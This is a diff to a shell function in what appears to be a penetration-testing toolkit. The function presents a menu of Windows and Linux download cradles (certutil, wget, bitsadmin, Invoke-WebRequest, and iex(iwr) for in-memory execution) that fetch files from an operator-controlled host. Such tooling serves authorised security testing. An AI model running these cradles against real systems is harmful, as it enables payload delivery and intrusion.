@@ -84,19 +84,23 @@ nb-srv-file-download() {
     clear
 
     __ask "Choose a command to copy:"
-    echo "1.  certutil -URLcache -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
-    echo "2.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
-    echo "3.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
-    echo "4.  Previous menu"
+    echo "1.  Invoke-WebRequest https://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
+    echo "2.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
+    echo "3.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
+    echo "4.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
+    echo "5.  bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\$filename"
+    echo "6.  Previous menu"
     echo
     echo -n "Choice: "
     read choice
 
     case $choice in
-        1) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
-        2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
-        3) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
-        4) exit;;
+        1) __COMMAND="Invoke-WebRequest https://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
+        2) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
+        3) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
+        4) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
+        5) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Temp\\$filename";;
+        6) exit;;
         *) echo "Invalid option";;
     esac
 
